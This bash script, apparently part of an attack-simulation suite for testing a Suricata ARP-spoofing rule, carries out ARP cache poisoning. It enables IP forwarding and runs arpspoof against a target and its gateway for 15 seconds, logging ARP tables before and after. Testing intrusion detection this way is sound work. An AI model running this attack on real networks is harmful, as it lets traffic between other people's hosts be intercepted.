#!/bin/bash
# =============================================================================
# arp_spoof.sh - ARP Cache Poisoning Attack (PFA)
# =============================================================================
# Maps to Suricata rule: sid:1000030 (ARP spoofing)
# =============================================================================
TARGET_IP="${1:-10.0.1.10}"
GATEWAY_IP="${2:-10.0.1.254}"
INTERFACE="${3:-eth0}"
LOG_DIR="/opt/pfa/attacks/logs"
mkdir -p "$LOG_DIR"
REPORT="$LOG_DIR/arpspoof_$(date +%Y%m%d_%H%M%S).log"

echo "[*] PFA ARP Spoofing Attack" | tee "$REPORT"
echo "[*] Target: $TARGET_IP" | tee -a "$REPORT"
echo "[*] Gateway: $GATEWAY_IP" | tee -a "$REPORT"
echo "[*] Interface: $INTERFACE" | tee -a "$REPORT"
echo "[*] Time: $(date -u)" | tee -a "$REPORT"
echo "" | tee -a "$REPORT"

# Enable IP forwarding (required for MITM)
echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true

# Display ARP table before spoofing
echo "[*] ARP table before attack:" | tee -a "$REPORT"
arp -a 2>&1 | tee -a "$REPORT"

# Launch ARP spoof (tell target we are gateway)
echo "[*] Launching ARP spoof attack for 15 seconds..." | tee -a "$REPORT"
arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY_IP" 2>&1 &
SPOOF_PID=$!

# Run for 15 seconds
sleep 15
kill $SPOOF_PID 2>/dev/null

echo "[*] Attack stopped" | tee -a "$REPORT"
echo "[*] ARP table after attack:" | tee -a "$REPORT"
arp -a 2>&1 | tee -a "$REPORT"

echo "" | tee -a "$REPORT"
echo "[*] ARP spoof complete. Report: $REPORT" | tee -a "$REPORT"
